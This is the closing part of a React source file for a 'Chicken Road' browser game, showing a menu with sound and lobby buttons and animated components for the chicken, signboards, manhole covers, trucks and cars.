              <div className="space-y-1.5">
                <button
                  onClick={() => { setSoundOn((p) => !p); }}
                  className="w-full text-left px-3 py-2.5 rounded-xl text-sm font-semibold"
                  style={{ background: "#0d0f14", border: "1px solid #232735" }}
                >
                  Sound: {soundOn ? "On 🔊" : "Off 🔇"}
                </button>
                <button
                  onClick={() => navigate("/")}
                  className="w-full text-left px-3 py-2.5 rounded-xl text-sm font-semibold"
                  style={{ background: "#0d0f14", border: "1px solid #232735" }}
                >
                  Back to lobby
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

// ============ COMPONENTS ============

const ChickenOnManhole = ({ jumpKey = 0 }: { jumpKey?: number }) => (
  <motion.div
    initial={{ scale: 0.6, opacity: 0 }}
    animate={{ scale: 1, opacity: 1 }}
    className="relative flex flex-col items-center justify-end"
    style={{ height: 130 }}
  >
    {/* Ground contact shadow — shrinks at jump peak, expands on landing for grounded feel */}
    <motion.div
      key={`shadow-${jumpKey}`}
      className="absolute pointer-events-none"
      style={{
        bottom: 2,
        width: 96,
        height: 18,
        background:
          "radial-gradient(ellipse at center, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.5) 45%, rgba(0,0,0,0) 75%)",
        filter: "blur(2px)",
        zIndex: 1,
      }}
      initial={{ scaleX: 1, opacity: 0.9 }}
      animate={{
        scaleX: [1, 0.45, 0.55, 1.15, 1],
        scaleY: [1, 0.6, 0.7, 1.1, 1],
        opacity: [0.9, 0.35, 0.45, 0.95, 0.9],
      }}
      transition={{ duration: 0.55, times: [0, 0.35, 0.55, 0.8, 1], ease: "easeOut" }}
    />
    {/* 3D Chicken jump — arcs forward (right), face turns toward jump direction, lands grounded */}
    <motion.div
      key={jumpKey}
      className="relative z-10"
      initial={{ y: -38, x: -18, rotate: -16, scale: 1.12 }}
      animate={{
        y: [-38, -14, 0, -4, 0],
        x: [-18, -6, 0, 0, 0],
        rotate: [-16, -8, 4, 0, 0],
        scale: [1.12, 1.05, 1, 1, 1],
      }}
      transition={{ duration: 0.55, times: [0, 0.45, 0.7, 0.85, 1], ease: "easeOut" }}
      style={{ transformOrigin: "bottom center" }}
    >
      <motion.div
        animate={{ rotate: [-2, 2, -2], y: [0, -1.5, 0] }}
        transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }}
        style={{ transformOrigin: "bottom center" }}
      >
        <motion.div
          animate={{ scaleY: [1, 1, 0.88, 1, 1, 1, 0.92, 1] }}
          transition={{ duration: 4.5, repeat: Infinity, ease: "easeInOut", times: [0, 0.3, 0.34, 0.38, 0.6, 0.68, 0.72, 0.76] }}
          style={{ transformOrigin: "bottom center" }}
        >
          <img
            src={chickenImg}
            alt="chicken"
            className="w-[128px] h-auto block"
            style={{
              filter:
                "drop-shadow(0 2px 1px rgba(0,0,0,0.55)) drop-shadow(0 6px 4px rgba(0,0,0,0.35))",
            }}
            loading="lazy"
          />
        </motion.div>
      </motion.div>
    </motion.div>
  </motion.div>
);

const Signboard = ({ value }: { value: string; color?: string }) => (
  <div className="relative flex flex-col items-center" style={{ width: 72 }}>
    <div className="relative" style={{ width: 72, height: 56 }}>
      <img
        src={signboardImg}
        alt=""
        className="absolute inset-0 w-full h-full object-contain"
        style={{ filter: "drop-shadow(0 4px 8px rgba(0,0,0,0.7))" }}
        loading="lazy"
      />
      <div
        className="absolute inset-0 flex items-start justify-center pt-[14px]"
      >
        <span
          className="font-black text-white"
          style={{
            fontSize: 14,
            textShadow: "0 2px 2px rgba(0,0,0,0.85)",
            letterSpacing: 0.5,
          }}
        >
          {value}
        </span>
      </div>
    </div>
  </div>
);

const ManholeCover = ({ label, crossed }: { label: string; crossed: boolean }) => (
  <div
    className="relative flex items-center justify-center"
    style={{ width: 60, height: 60 }}
  >
    <img
      src={manholeImg}
      alt=""
      className="absolute inset-0 w-full h-full object-contain"
      style={{
        filter: crossed
          ? "drop-shadow(0 0 12px rgba(80,220,120,0.8)) hue-rotate(80deg) saturate(1.4)"
          : "drop-shadow(0 4px 6px rgba(0,0,0,0.7))",
      }}
      loading="lazy"
    />
    <span
      className="relative font-black z-10"
      style={{
        fontSize: label.length > 4 ? 11 : 14,
        color: "#ffffff",
        textShadow:
          "0 0 6px rgba(0,0,0,0.95), 0 2px 3px rgba(0,0,0,0.9), 0 0 2px rgba(255,255,255,0.4)",
      }}
    >
      {label}
    </span>
  </div>
);

const Truck = ({ color: _color }: { color?: string }) => (
  <div className="relative" style={{ width: 56 }}>
    <div
      className="absolute left-1/2 -translate-x-1/2 -bottom-6 w-12 h-10 pointer-events-none"
      style={{
        background:
          "radial-gradient(ellipse at top, rgba(255,240,180,0.7) 0%, transparent 70%)",
      }}
    />
    <img
      src={truckImg}
      alt=""
      className="w-full h-auto block"
      style={{ filter: "drop-shadow(0 4px 8px rgba(0,0,0,0.7))" }}
      loading="lazy"
    />
  </div>
);

const Car = ({ color: _color }: { color?: string }) => (
  <div className="relative" style={{ width: 44 }}>
    <div
      className="absolute left-1/2 -translate-x-1/2 -bottom-5 w-10 h-8 pointer-events-none"
      style={{
        background:
          "radial-gradient(ellipse at top, rgba(255,240,180,0.6) 0%, transparent 70%)",
      }}
    />
    <img
      src={carImg}
      alt=""
      className="w-full h-auto block"
      style={{ filter: "drop-shadow(0 4px 8px rgba(0,0,0,0.7))" }}
      loading="lazy"
    />
  </div>
);

export default ChickenRoadGame;
